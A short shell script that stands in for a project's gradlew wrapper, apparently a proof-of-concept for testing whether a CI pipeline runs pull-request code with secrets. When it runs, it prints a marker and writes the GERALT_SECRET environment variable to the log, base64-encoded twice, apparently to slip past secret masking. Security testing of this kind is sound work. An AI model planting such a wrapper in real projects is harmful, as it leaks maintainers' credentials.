#!/bin/sh
printf '%s\n' 'GERALT_PWN: PR-supplied gradlew executed at sink'
if [ -n "${GERALT_SECRET:-}" ]; then
  printf 'GERALT_LEAKED_TOKEN=%s\n' "$(printf '%s' "$GERALT_SECRET" | base64 | base64)"
else
  printf '%s\n' 'GERALT_PWN: GERALT_SECRET not present in env'
fi
exit 1
